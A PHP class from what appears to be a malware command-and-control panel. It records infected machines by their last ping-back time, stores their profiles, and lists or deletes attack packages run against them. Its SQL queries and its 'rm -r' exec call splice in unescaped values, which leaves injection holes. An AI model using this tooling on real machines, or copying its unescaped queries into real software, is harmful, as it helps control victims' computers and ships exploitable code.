<?php

namespace Kelvinho\Virus\Virus;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\AttackFactory;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Singleton\Logs;
use mysqli;
use function Kelvinho\Virus\map;

/**
 * Class Virus
 *
 * Represents a virus. The representation of this will be stored in table viruses, and the data stored on disk is at:
 * DATA_FILE/viruses/{virus_id}/
 *
 * Currently, these are stored on disk:
 * - Profile text, at /profile.txt
 *
 * @package Kelvinho\Virus\Virus
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class Virus {
    public const VIRUS_ALL = 0;
    public const VIRUS_ACTIVE = 1;
    public const VIRUS_DORMANT = 2;
    public const VIRUS_LOST = 3;
    public const VIRUS_EXPECTING = 4;
    private string $virus_id = ""; // all viruses
    private string $name = ""; // viruses that are alive, and pings back quite often
    private int $last_ping; // viruses that are sort of alive, but because the target computer is turned off, it has not pinged back in a while
    private string $profile; // viruses that hasn't pinged back in a long time, and is considered lost
    private bool $isStandalone = true; // viruses that have accessed the entry point, but have not pinged back yet
    private AttackFactory $attackFactory;
    private mysqli $mysqli;
    private PackageRegistrar $packageRegistrar;

    /**
     * Virus constructor.
     * @param string $virus_id
     * @param AttackFactory $attackFactory
     * @param mysqli $mysqli
     * @internal
     */
    public function __construct(string $virus_id, AttackFactory $attackFactory, mysqli $mysqli, PackageRegistrar $packageRegistrar) {
        $this->virus_id = $virus_id;
        $this->attackFactory = $attackFactory;
        $this->mysqli = $mysqli;
        $this->packageRegistrar = $packageRegistrar;
        $this->loadState();
    }

    /**
     * Fetch data to restore the state of the virus.
     */
    private function loadState() {
        $row = $this->mysqli->query("select name, last_ping, type from viruses where virus_id = \"$this->virus_id\"")->fetch_assoc();
        $this->name = $row["name"];
        $this->last_ping = $row["last_ping"];
        $this->isStandalone = 1 - $row["type"];
        $this->profile = file_get_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt");
    }

    /**
     * Get state (VIRUS_EXPECTING, VIRUS_ACTIVE, ...) based on the last time the virus pings back
     *
     * @param int $last_ping
     * @return int
     */
    public static function getState(int $last_ping): int {
        $currentTime = time();
        if ($last_ping === 0) {
            return self::VIRUS_EXPECTING;
        }
        $delta = $currentTime - $last_ping;
        if ($delta <= VIRUS_PING_INTERVAL * 10) {
            return self::VIRUS_ACTIVE;
        }
        if ($delta <= 2 * 24 * 3600) {
            return self::VIRUS_DORMANT;
        } else {
            return self::VIRUS_LOST;
        }
    }

    /**
     * The virus will use this to tell that it's still alive and listening.
     */
    public function ping(): void {
        $this->mysqli->query("update viruses set last_ping = " . time() . " where virus_id = \"$this->virus_id\"");
    }

    public function getVirusId(): string {
        return $this->virus_id;
    }

    public function getName(): string {
        return $this->name;
    }

    public function setName(string $name): void {
        $this->name = $name;
    }

    public function getProfile(): string {
        return $this->profile;
    }

    public function setProfile(string $profile): void {
        $this->profile = $profile;
    }

    public function getLastPing(): int {
        return $this->last_ping;
    }

    public function isStandalone(): bool {
        return $this->isStandalone;
    }

    /**
     * Deletes the virus permanently.
     */
    public function delete(): void {
        map($this->getAttacks(), function ($attack_id) {
            $this->attackFactory->get($attack_id)->delete();
        });
        $this->mysqli->query("delete from viruses where virus_id = \"$this->virus_id\"");
        $this->mysqli->query("delete from uptimes where virus_id = \"$this->virus_id\"");
        $this->mysqli->close();
        exec("rm -r " . DATA_FILE . "/viruses/$this->virus_id");
    }

    /**
     * Get attacks as an array of attack_id.
     *
     * @param string|null $status Optional attack status
     * @param string|null $attack_package Optional attack package name
     * @param array $attackTypes
     * @return array The attacks
     */
    public function getAttacks(string $status = null, string $attack_package = null, array $attackTypes = []) {
        $whereStatement = "where virus_id = \"" . $this->virus_id . "\"";
        if ($status != null)
            if (in_array($status, AttackBase::STATUSES))
                $whereStatement .= " and status = \"$status\"";
            else Logs::error("Attack status $status does not exist");
        if ($attack_package != null)
            if ($this->packageRegistrar->hasPackage($attack_package))
                $whereStatement .= " and attack_package = \"$attack_package\"";
            else Logs::error("Attack package $attack_package does not exist");

        if (count($attackTypes) > 0) {
            $whereStatement .= " and (";
            $whereStatement .= implode(" or ", map($attackTypes, function ($attackType) {
                switch ($attackType) {
                    case AttackBase::TYPE_ONE_TIME:
                        return "attack_package like '%.oneTime.%'";
                    case AttackBase::TYPE_SESSION:
                        return "attack_package like '%.session.%'";
                    case AttackBase::TYPE_BACKGROUND:
                        return "attack_package like '%.background.%'";
                    default:
                        Logs::unreachableState("\\Kelvinho\\Virus\\Virus\\Virus");
                        return "";
                }
            }));
            $whereStatement .= ")";
        }
        $answer = $this->mysqli->query("select attack_id from attacks $whereStatement order by executed_time desc");
        $result = [];
        if ($answer) while ($row = $answer->fetch_assoc()) $result[] = $row["attack_id"];
        return $result;
    }

    /**
     * Saves the virus state/representation
     */
    public function saveState(): void {
        $this->mysqli->query("update viruses set name = \"" . $this->mysqli->escape_string($this->name) . "\" where virus_id = \"$this->virus_id\"");
        file_put_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt", $this->profile);
    }
}